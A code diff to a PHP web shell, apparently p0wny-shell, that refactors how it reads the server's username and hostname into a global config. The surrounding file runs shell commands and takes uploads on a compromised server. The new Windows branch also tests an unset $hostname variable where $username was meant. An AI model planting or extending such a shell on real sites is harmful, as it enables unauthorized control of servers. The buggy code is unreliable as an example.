@@ -81,18 +81,6 @@ function featureShell($cmd, $cwd) {
     );
 }
 
-function featureCurrentUser() {
-    $username = isRunningWindows() ? getenv('USERNAME') : posix_getpwuid(posix_geteuid())['name'];
-    if ($username === false) {
-        $username = "p0wny";
-    }
-    $hostname = gethostname();
-    if ($hostname === false) {
-        $hostname = "shell";
-    }
-    return ["username" => $username, "hostname" => $hostname];
-}
-
 function featurePwd() {
     return array("cwd" => getcwd());
 }
@@ -144,6 +132,27 @@ function featureUpload($path, $file, $cwd) {
     }
 }
 
+function initShellConfig() {
+    global $SHELL_CONFIG;
+
+    if (isRunningWindows()) {
+        $username = getenv('USERNAME');
+        if ($hostname !== false) {
+            $SHELL_CONFIG['username'] = $username;
+        }
+    } else {
+        $pwuid = posix_getpwuid(posix_geteuid());
+        if ($pwuid !== false) {
+            $SHELL_CONFIG['username'] = $pwuid['name'];
+        }
+    }
+
+    $hostname = gethostname();
+    if ($hostname !== false) {
+        $SHELL_CONFIG['hostname'] = $hostname;
+    }
+}
+
 if (isset($_GET["feature"])) {
 
     $response = NULL;
@@ -170,7 +179,7 @@ if (isset($_GET["feature"])) {
     echo json_encode($response);
     die();
 } else {
-    $SHELL_CONFIG = array_merge($SHELL_CONFIG, featureCurrentUser());
+    initShellConfig();
 }
 
 ?><!DOCTYPE html>
